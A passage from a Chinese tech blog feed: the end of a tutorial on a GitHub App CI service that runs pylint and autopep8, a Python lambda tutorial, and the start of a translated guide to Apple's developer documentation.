文件即可。</p><h3><span id="bu-zou-2-2-ke-long-cang-ku">步骤 2.2. 克隆仓库</span></h3><p>使用 GitPython 库处理，使用临时目录进行克隆。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">clone_repository</span>(<span class="params">full_repo_name, repository, ref, installation_token, clean=<span class="literal">False</span></span>):</span><br><span class="line">    repo_dir = tempfile.mkdtemp()</span><br><span class="line">    git.Git(repo_dir).clone(<span class="string">f&quot;https://x-access-token:<span class="subst">&#123;installation_token&#125;</span>@github.com/<span class="subst">&#123;full_repo_name&#125;</span>.git&quot;</span>)</span><br><span class="line">    <span class="comment"># pull and chekout</span></span><br><span class="line">    repo = git.Repo(<span class="string">f&quot;<span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>&quot;</span>)</span><br><span class="line">    repo.git.pull()</span><br><span class="line">    repo.git.checkout(ref)</span><br><span class="line">    <span class="keyword">if</span> clean:</span><br><span class="line">        shutil.rmtree(tempdir, ignore_errors=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> repo_dir</span><br></pre></td></tr></table></figure><p>运行 CI 测试：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ***** RUN A CI TEST *****</span></span><br><span class="line">full_repo_name = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>]</span><br><span class="line">repository = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;name&quot;</span>]</span><br><span class="line">head_sha = github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;head_sha&quot;</span>]</span><br><span class="line">repo_dir = clone_repository(</span><br><span class="line">    full_repo_name,</span><br><span class="line">    repository,</span><br><span class="line">    head_sha,</span><br><span class="line">    installation_token=github_app.github_app_installation.token,</span><br><span class="line">    clean=<span class="literal">True</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-3-yun-xing-pylint">步骤 2.3. 运行 pylint</span></h3><p>pylint 运行并输出json结果。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">command = <span class="string">f&quot;pylint <span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>/**/*.py -f json&quot;</span></span><br><span class="line">report = subprocess.getoutput(command)</span><br><span class="line">shutil.rmtree(repo_dir)</span><br><span class="line">output = json.loads(report)</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-4-shou-ji-pylint-cuo-wu">步骤 2.4. 收集 pylint 错误</span></h3><p>pylint结果与 <code>rubocop</code> 类似，收集并解析结果：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lint</span></span><br><span class="line">max_annotations = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">annotations = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># RuboCop reports the number of errors found in &quot;offense_count&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">    conclusion = <span class="string">&quot;success&quot;</span></span><br><span class="line">    actions = <span class="literal">None</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conclusion = <span class="string">&quot;neutral&quot;</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> output:</span><br><span class="line"></span><br><span class="line">        file_path = re.sub(<span class="string">f&quot;<span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>/&quot;</span>, <span class="string">&quot;&quot;</span>, file[<span class="string">&quot;path&quot;</span>])</span><br><span class="line">        annotation_level = <span class="string">&quot;notice&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse each offense to get details and location</span></span><br><span class="line">        <span class="comment"># Limit the number of annotations to 50</span></span><br><span class="line">        <span class="keyword">if</span> max_annotations == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        max_annotations -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        start_line = file[<span class="string">&quot;line&quot;</span>]</span><br><span class="line">        end_line = file[<span class="string">&quot;line&quot;</span>]</span><br><span class="line">        start_column = file[<span class="string">&quot;column&quot;</span>]</span><br><span class="line">        end_column = file[<span class="string">&quot;column&quot;</span>]</span><br><span class="line">        message = file[<span class="string">&quot;message&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Create a new annotation for each error</span></span><br><span class="line">        annotation = &#123;</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: file_path,</span><br><span class="line">            <span class="string">&quot;start_line&quot;</span>: start_line,</span><br><span class="line">            <span class="string">&quot;end_line&quot;</span>: end_line,</span><br><span class="line">            <span class="string">&quot;start_column&quot;</span>: start_column,</span><br><span class="line">            <span class="string">&quot;end_column&quot;</span>: end_column,</span><br><span class="line">            <span class="string">&quot;annotation_level&quot;</span>: annotation_level,</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: message,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># # Annotations only support start and end columns on the same line</span></span><br><span class="line">        <span class="comment"># if start_line == end_line:</span></span><br><span class="line">        <span class="comment">#     annotation.merge(&#123;&quot;start_column&quot;: start_column, &quot;end_column&quot;: end_column&#125;)</span></span><br><span class="line"></span><br><span class="line">        annotations.append(annotation)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Need fix action</span></span><br><span class="line">    actions = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;label&quot;</span>: <span class="string">&quot;Fix this&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Automatically fix all linter notices.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;identifier&quot;</span>: <span class="string">&quot;fix_rubocop_notices&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-5-shi-yong-ci-ce-shi-jie-guo-geng-xin-jian-cha-yun-xing">步骤 2.5. 使用 CI 测试结果更新检查运行</span></h3><p>整理结果，并添加修复动作：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">summary = (</span><br><span class="line">    <span class="string">f&quot;Summary\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;- Offense count: <span class="subst">&#123;<span class="built_in">len</span>(output)&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="string">f&quot;- File count: <span class="subst">&#123;<span class="built_in">len</span>(<span class="built_in">set</span>([file[<span class="string">&#x27;path&#x27;</span>] <span class="keyword">for</span> file <span class="keyword">in</span> output]))&#125;</span>\n&quot;</span></span><br><span class="line">)</span><br><span class="line">text = <span class="string">&quot;Octo Pylinter version: pylint&quot;</span></span><br><span class="line"><span class="comment"># Mark the check run as complete!</span></span><br><span class="line">check_run.edit(</span><br><span class="line">    name=APP_NAME,</span><br><span class="line">    status=<span class="string">&quot;completed&quot;</span>,</span><br><span class="line">    completed_at=datetime.now(),</span><br><span class="line">    conclusion=conclusion,</span><br><span class="line">    output=&#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Octo Pylinter&quot;</span>,</span><br><span class="line">        <span class="string">&quot;summary&quot;</span>: summary,</span><br><span class="line">        <span class="string">&quot;text&quot;</span>: text,</span><br><span class="line">        <span class="string">&quot;annotations&quot;</span>: annotations,</span><br><span class="line">    &#125;,</span><br><span class="line">    actions=actions,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3><span id="bu-zou-2-6-zi-dong-xiu-fu-cuo-wu">步骤 2.6. 自动修复错误</span></h3><p>沿用 <code>fix_rubocop_notices</code> 这个 ID，使用 <code>autopep8</code> 做 python 文件的修正，将结果以 PR 的方式提交。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@github_app.on(<span class="params">[<span class="string">&quot;check_run.requested_action&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">take_requested_action</span>():</span><br><span class="line">    full_repo_name = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;full_name&quot;</span>]</span><br><span class="line">    repository = github_app.payload[<span class="string">&quot;repository&quot;</span>][<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    head_branch = github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;check_suite&quot;</span>][<span class="string">&quot;head_branch&quot;</span>]</span><br><span class="line">    check_run_id = github_app.payload[<span class="string">&quot;check_run&quot;</span>][<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> github_app.payload[<span class="string">&quot;requested_action&quot;</span>][<span class="string">&quot;identifier&quot;</span>] == <span class="string">&quot;fix_rubocop_notices&quot;</span>:</span><br><span class="line">        repo_dir = clone_repository(</span><br><span class="line">            full_repo_name,</span><br><span class="line">            repository,</span><br><span class="line">            head_branch,</span><br><span class="line">            installation_token=github_app.github_app_installation.token,</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># Automatically correct style errors</span></span><br><span class="line">        <span class="comment"># fix with autopep8</span></span><br><span class="line">        command = <span class="string">f&quot;autopep8 -a -i <span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>/**/*.py&quot;</span></span><br><span class="line">        report = subprocess.getoutput(command)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create new branch</span></span><br><span class="line">        new_branch = <span class="string">f&quot;fix_rubocop_notices_<span class="subst">&#123;check_run_id&#125;</span>&quot;</span></span><br><span class="line">        pushed = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            repo = git.Repo(<span class="string">f&quot;<span class="subst">&#123;repo_dir&#125;</span>/<span class="subst">&#123;repository&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> repo.index.diff(<span class="literal">None</span>) <span class="keyword">or</span> repo.untracked_files:</span><br><span class="line">                current = repo.create_head(new_branch)</span><br><span class="line">                current.checkout()</span><br><span class="line">                repo.config_writer().set_value(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;name&quot;</span>, config.GITHUB_APP_USER_NAME).release()</span><br><span class="line">                repo.config_writer().set_value(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;email&quot;</span>, config.GITHUB_APP_USER_EMAIL).release()</span><br><span class="line">                repo.git.add(update=<span class="literal">True</span>)</span><br><span class="line">                repo.git.commit(<span class="string">&quot;-m&quot;</span>, <span class="string">&quot;Automatically fix Octo RuboCop notices.&quot;</span>)</span><br><span class="line">                repo.git.push(<span class="string">&quot;--set-upstream&quot;</span>, <span class="string">&quot;origin&quot;</span>, current)</span><br><span class="line">                pushed = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;no changes&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed to commit and push&quot;</span>)</span><br><span class="line">            <span class="comment"># # Nothing to commit!</span></span><br><span class="line">            <span class="comment"># print(&quot;Nothing to commit&quot;)</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            shutil.rmtree(repo_dir, ignore_errors=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pushed:</span><br><span class="line">            <span class="comment"># create pull request</span></span><br><span class="line">            client = github_app.github_app_installation.get_github_client()</span><br><span class="line">            repo = client.get_repo(full_repo_name)</span><br><span class="line">            body = <span class="string">&quot;&quot;&quot;Automatically fix Octo RuboCop notices.&quot;&quot;&quot;</span></span><br><span class="line">            pr = repo.create_pull(</span><br><span class="line">                title=<span class="string">&quot;Automatically fix Octo RuboCop notices.&quot;</span>, body=body, head=new_branch, base=<span class="string">&quot;master&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Pull Request number: <span class="subst">&#123;pr.number&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>在以上步骤的基础上，可以构建更复杂的测试过程，完成不同的需求。</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      使用 Python 集成 GitHub App 和 GitHub Check API，构建持续集成服务
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>08. Lambda 函数 — Python 进阶</title>
    <link href="https://qiwihui.com/qiwihui-blog-125/"/>
    <id>https://qiwihui.com/qiwihui-blog-125/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Lambda函数是一个小的（一行）匿名函数，没有函数名称。 Lambda函数可以接受任意数量的参数，但只能具有一个表达式。 虽然使用def关键字定义了普通函数，但在Python中，使用lambda关键字定义了匿名函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arguments: expression</span><br></pre></td></tr></table></figure><p>当简单函数仅在代码中使用一次或短时间时，可以使用Lambda函数。 最常见的用途是作为高阶函数（将其他函数作为参数的函数）的参数。 它们还与诸如 <code>map()</code>， <code>filter()</code> ， <code>reduce()</code>之类的内置函数一起使用。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一个给参数加10的lambda函数</span></span><br><span class="line">f = <span class="keyword">lambda</span> x: x+<span class="number">10</span></span><br><span class="line">val1 = f(<span class="number">5</span>)</span><br><span class="line">val2 = f(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(val1, val2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个返回两个参数乘积的lambda函数</span></span><br><span class="line">f = <span class="keyword">lambda</span> x,y: x*y</span><br><span class="line">val3 = f(<span class="number">2</span>,<span class="number">10</span>)</span><br><span class="line">val4 = f(<span class="number">7</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(val3, val4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> <span class="number">110</span></span><br><span class="line"><span class="number">20</span> <span class="number">35</span></span><br></pre></td></tr></table></figure><h3><span id="shi-yong-shi-li-ling-yi-ge-han-shu-nei-de-lambda-han-shu">使用示例：另一个函数内的Lambda函数</span></h3><p>从另一个函数返回定制的lambda函数，并根据需要创建不同的函数变体。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: x * n</span><br><span class="line"></span><br><span class="line">doubler = myfunc(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(doubler(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">tripler = myfunc(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(tripler(<span class="number">6</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">18</span></span><br></pre></td></tr></table></figure><h3><span id="shi-yong-lambda-han-shu-zuo-wei-key-can-shu-de-zi-ding-yi-pai-xu">使用lambda函数作为key参数的自定义排序</span></h3><p>key函数会在排序之前转换每个元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">points2D = [(<span class="number">1</span>, <span class="number">9</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">5</span>, -<span class="number">3</span>), (<span class="number">10</span>, <span class="number">2</span>)]</span><br><span class="line">sorted_by_y = <span class="built_in">sorted</span>(points2D, key= <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(sorted_by_y)</span><br><span class="line"></span><br><span class="line">mylist = [- <span class="number">1</span>, -<span class="number">4</span>, -<span class="number">2</span>, -<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">sorted_by_abs = <span class="built_in">sorted</span>(mylist, key= <span class="keyword">lambda</span> x: <span class="built_in">abs</span>(x))</span><br><span class="line"><span class="built_in">print</span>(sorted_by_abs)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">5</span>, -<span class="number">3</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">10</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">9</span>)]</span><br><span class="line">[-<span class="number">1</span>, <span class="number">1</span>, -<span class="number">2</span>, <span class="number">2</span>, -<span class="number">3</span>, <span class="number">3</span>, -<span class="number">4</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h3><span id="zai-map-han-shu-zhong-shi-yong-lambda-han-shu">在 map 函数中使用 Lambda 函数</span></h3><p><code>map(func, seq)</code> ，使用函数转换每个元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a  = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x * <span class="number">2</span> , a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 但是，尝试使用列表推导</span></span><br><span class="line"><span class="comment"># 如果你已经定义了函数，请使用 map</span></span><br><span class="line">c = [x*<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>]</span><br></pre></td></tr></table></figure><h3><span id="zai-filter-han-shu-zhong-shi-yong-lambda-han-shu">在 filter 函数中使用 Lambda 函数</span></h3><p><code>filter(func, seq)</code> ，返回其 <code>func</code> 计算为 <code>True</code> 的所有元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">b = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: (x%<span class="number">2</span> == <span class="number">0</span>) , a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样可以使用列表推导实现</span></span><br><span class="line">c = [x <span class="keyword">for</span> x <span class="keyword">in</span> a <span class="keyword">if</span> x%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure><h3><span id="reduce">reduce</span></h3><p><code>reduce(func, seq)</code> ，重复将 <code>func</code> 应用于元素并返回单个值。<code>func</code> 需要2个参数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">product_a = reduce(<span class="keyword">lambda</span> x, y: x*y, a)</span><br><span class="line"><span class="built_in">print</span>(product_a)</span><br><span class="line">sum_a = reduce(<span class="keyword">lambda</span> x, y: x+y, a)</span><br><span class="line"><span class="built_in">print</span>(sum_a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">24</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      08. Lambda 函数 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>如何阅读苹果开发文档</title>
    <link href="https://qiwihui.com/qiwihui-blog-46/"/>
    <id>https://qiwihui.com/qiwihui-blog-46/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://user-images.githubusercontent.com/3297411/51306754-16f48780-1a79-11e9-9959-b6f94a4cae45.jpg" alt="coding-woman-5"></p><p>原文：<a href="https://www.hackingwithswift.com/articles/167/how-to-read-apples-developer-documentation">How to read Apple’s developer documentation</a></p><p>对于很多人来说，这篇文章听起来很奇怪，因为我们已经习惯了 Apple 的 API 文档的工作方式，因此我们精神上已经经过调整以快速找到我们想要的东西。</p><p>但这是一个有趣的事实：去年我最热门的文章请求之一是帮助人们真正阅读 Apple 的代码文档。您如何找到您需要的 iOS API，如何浏览所有材料以找到您真正想要的内容，以及您如何深入了解为什么事情按照他们的方式工作？</p><p>所以，如果你曾经寻求帮助来理解 Apple 的开发者文档，首先我要让你知道你并不孤单 - 许多人都在努力解决这个问题。但其次，我希望这篇文章会有所帮助：我会尽力解释它的结构，它有什么好处（以及不好的地方），以及如何使用它。</p><p>更重要的是，我将向您展示经验丰富的开发人员寻找额外信息的位置，这些信息通常比Apple的在线文档更有价值。</p><span id="more"></span><h2><span id="zhe-shi-shi-me-vs-ni-zen-me-yong-ta">“这是什么？” vs “你怎么用它？”</span></h2><p>任何书面的 API 文档通常采用以下五种形式之一：</p><ol><li>接口代码，显示了什么是方法名称和参数，属性名称和类型，以及类似的，带有一些描述它应该做什么的文本。</li><li>API 的文本描述了它应该做什么以及一般指导用例。</li><li>广泛使用的有用的 API 示例代码。</li><li>如何使用 API 代码段。</li><li>解决常见问题的简单教程：如何做 X，如何做 Y，以及如何做 Z 等等。</li></ol><p>粗略地说，苹果公司第一点做了很多，其次是第二点和第三点，第四点很少，第五点几乎没有。</p><p>所以，如果你正在寻找“如何用 Y 做 X ”的具体例子，你最好从我的 <a href="https://www.hackingwithswift.com/example-code">Swift 知识库</a>开始 - 这正是它的用途。</p><p>了解 Apple 的文档解决的问题，可以帮助您从中获得最大收益。它并不是一个结构化的教程，它不会向您介绍一系列概念来帮助您实现目标，而是作为 Apple 支持的数千个 API 的参考指南。</p><h2><span id="xun-zhao-yi-ge-lei">寻找一个类</span></h2><p>Apple的在线文档位于 <a href="https://developer.apple.com/documentation/">https://developer.apple.com/documentation/</a> ，虽然您能在 Xcode 中使用本地副本，但我会说大多数人使用在线版本只是因为他们可以更容易地找到内容。</p><p>绝大多数 Apple 的文档都描述了接口，而这正是大多数时候你会看到的。我想使用一个实际的例子，所以请先在您的网络浏览器中打开https://developer.apple.com/documentation/ ，这是所有Apple开发者文档的主页。</p><p><img src="https://user-images.githubusercontent.com/3297411/51331392-9f444e00-1ab4-11e9-94df-48407c8102c3.png" alt="apple-developer-documentation"></p><p>您会看到所有 Apple 的 API 分为 <code>App Frameworks</code> 或 <code>Graphics and Games</code> 等类别，您已经看到了一件重要的事情：所有深蓝色文本都是可点击的，并会带您进入特定框架的API文档。是的，它使用相同的字体和大小，没有下划线，说实话，深蓝色链接和黑色文本之间没有太大区别，但你仍然需要留意这些链接 - 有很多他们，你会用它们来深入挖掘主题。</p><p>现在请从 <code>App Frameworks</code> 类别中选择 <code>UIKit</code>，您将看到它的功能（为iOS创建用户界面）的简要概述，标有“<code>重要</code>”（<code>Important</code>）的大黄色框，然后是类别列表。那些黄色的盒子确实值得关注：虽然它们经常被使用，它们几乎总能阻止你犯下根本错误，这些错误导致出现奇怪的问题。</p><p><img src="https://user-images.githubusercontent.com/3297411/51331416-aa977980-1ab4-11e9-886a-9dc54dae0189.png" alt="uikit-overview"></p><p>此页面上重要的是共同描述 <code>UIKit</code> 的类别列表。这是人们经常迷路的地方：他们想要了解像 <code>UIImage</code> 这样的东西，所以他们必须仔细查看该列表以找到它可能出现的合适位置。</p><p><img src="https://user-images.githubusercontent.com/3297411/51331432-b4b97800-1ab4-11e9-8d70-de35c34d58d4.png" alt="uikit-topics"></p><p>在这种情况下，您可能会查看“资源管理”（<code>Resource Management</code>），因为它的副标题“管理存储在主可执行文件之外的图像，字符串，故事板和 nib 文件”听起来很有希望。但是，您会感到失望 - 您需要向下滚动到 “图像和 PDF”（<code>Images and PDF</code>）部分才能找到 <code>UIImage</code>。</p><p>这就是为什么我谈过的大多数人只是使用自己喜欢的搜索引擎。他们输入他们关心的类，并且 - 只要它有“UI”，“SK”或类似的前缀 - 它可能是第一个结果。</p><p>不要误会我的意思：我知道这种做法并不理想。但是面对搜索一个类或者去 <a href="https://developer.apple.com/documentation/">https://developer.apple.com/documentation/</a> ，选择一个框架，选择一个类别，然后选择一个类，第一个就是更快。</p><p>重要提示：无论您选择哪种方法，最终都会在同一个地方，所以只做最适合您的方法。现在，请找到并选择 <code>UIImage</code>。</p><h2><span id="yue-du-lei-de-jie-kou">阅读类的接口</span></h2><p>一旦选择了您关心的类，该页面就有四个主要组件：概述，版本摘要，接口和关系。</p><p><img src="https://user-images.githubusercontent.com/3297411/51334152-32cc4d80-1aba-11e9-9748-3ffdab35aafc.png" alt="uiimage-overview"></p><p>概述是“API的文本描述，描述了它应该做什么以及一般指导用例”，我之前提到过 - 我要求你选择 <code>UIImage</code>，因为它是文本描述何时运行良好的一个很好的例子。</p><p>当它是我第一次使用的类时，特别是如果它刚刚推出时，我通常会阅读概述文本。但是对于其他一切 - 我之前至少使用过一次的任何类 - 我跳过它并尝试找到我所得到的具体细节。请记住，Apple 文档确实不是一种学习工具：当您考虑到特定目的时，它最有效。</p><p>如果您不总是为所选 Apple 平台的最新版本开发，则版本摘要 - 页面右侧的侧栏 - 非常重要。在这种情况下，您将看到 <code>iOS 2.0 +</code>，<code>tvOS 9.0+</code> 和 <code>watchOS 2.0+</code>，它告诉我们何时 <code>UIImage</code> 类首次在这三个操作系统上可用，并且它仍然可用 - 如果它已被弃用（不再可用）你会看到像 <code>iOS 2.0-9.0</code> 这样的东西。</p><p>此页面上的实际内容 - 以及作为 Apple 框架中特定类的主页的所有页面 - 都列在“主题”标题下。这将列出该类支持的所有属性和方法，再次分解为使用类别：“获取图像数据”，“获取图像大小和比例”等。</p><p><img src="https://user-images.githubusercontent.com/3297411/51334198-44adf080-1aba-11e9-8d86-2eac5e0191d2.png" alt="uiimage-topics"></p><p>如果您选择的类具有任何自定义初始化方法，则始终会首先显示它们。 <code>UIImage</code> 有很多自定义初始化方法，你会看到它们都被列为签名 - 只是描述它所期望的参数的部分。所以，你会看到这样的代码：</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">init?</span>(<span class="params">named</span>: <span class="type">String</span>)</span><br><span class="line"><span class="keyword">init</span>(<span class="params">imageLiteralResourceName</span>: <span class="type">String</span>)</span><br></pre></td></tr></table></figure><p>**提示：**如果您看到 <code>Objective-C</code> 代码，请确保将语言更改为 <code>Swift</code>。您可以在页面的右上角执行此操作，也可以在重要的 iOS 测试版引入更改时启用 API 更改选项。</p><p><img src="https://user-images.githubusercontent.com/3297411/51334211-4aa3d180-1aba-11e9-8d34-33f922b01733.png" alt="switch-swift"></p><p>记住，初始化方法写成 <code>init?</code> 而不是 <code>init</code> 的是容易出错的 - 它们返回一个可选项，以便在初始化失败时它们可以返回 <code>nil</code>。</p><p>在初始化器的正下方，您有时会看到一些用于创建类的高度专业化实例的方法。这些不是 Swift 意义上的初始化器，但它们确实创建了类的实例。对于 <code>UIImage</code>，你会看到这样的事情：</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">func</span> <span class="title class_">animatedImageNamed</span>(<span class="title class_">String</span>, <span class="title class_">duration</span>: <span class="title class_">TimeInterval</span>) -&gt; <span class="title class_">UIImage</span>?</span><br></pre></td></tr></table></figure><p><code>class func</code> 部分意味着你将使用 <code>UIImage.animatedImageNamed()</code> 方式调用。</p><p>在初始化程序之后，事情变得有点不那么有条理：你会发现属性方法和枚举自由混合在一起。虽然您可以滚动查找您要查找的内容，但我可以认为大多数人只需要 <code>Cmd + F</code> 在页面上查找文字就可以了！</p><p>有三点需要注意：</p><ul><li>嵌套类型 - 类，结构和枚举 - 与属性和方法一起列出，这需要一点时间习惯。例如，<code>UIImage</code> 包含嵌套的枚举 <code>ResizingMode</code>。</li><li>任何带有直线穿过的东西都是不推荐使用的。这意味着 Apple 